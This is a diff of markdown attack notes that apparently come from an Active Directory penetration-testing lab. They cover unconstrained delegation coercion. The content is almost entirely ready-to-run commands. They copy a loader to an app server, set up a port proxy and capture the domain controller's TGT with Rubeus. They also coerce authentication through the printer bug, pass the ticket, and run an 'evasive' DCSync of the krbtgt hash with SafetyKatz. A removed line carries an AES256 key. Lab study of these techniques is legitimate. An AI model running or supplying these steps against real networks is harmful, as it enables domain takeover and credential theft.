@@ -1,5 +1,17 @@
 ### Unconstrained Delegation Coercion
 Coarse/Force machine accounts to connect to a machine and capture their TGT
+```powershell
+Get-DomainComputer -UnConstrained
+```
+
+Copy Loader over and setup portforward
+```powershell
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe 
+
+winrs -r:dcorp-appsrv "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
+
+winrs -r:dcorp-appsrv cmd
+```
 
 Use Rubeus on App server (`dcorp-appsrv`) to capture TGT of DC machine account
 ```powershell
@@ -8,23 +20,18 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor 
 
 Abuse printer bug to force the DC to connect to the App server
 ```powershell
-Loader.exe -path .\MS-RPRN.exe -args \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+C:\Users\Public\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
 ```
 
 Copy the base64 encoded TGT, remove extra spaces (if any) and use it on your attacking host
 ```powershell
-.\Loader.exe -path .\Rubeus.exe -args ptt /ticket:<base64>
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args ptt /ticket:<base64>
 ```
 
 Perform DCsync thats OPSEC safe because it's the machine account
 ```powershell
-.\Loader.exe -path .\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
-
-```powershell
-.\Loader.exe -path .\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-```
-
 
 ---
 ### Abusing Unconstrained Delegation
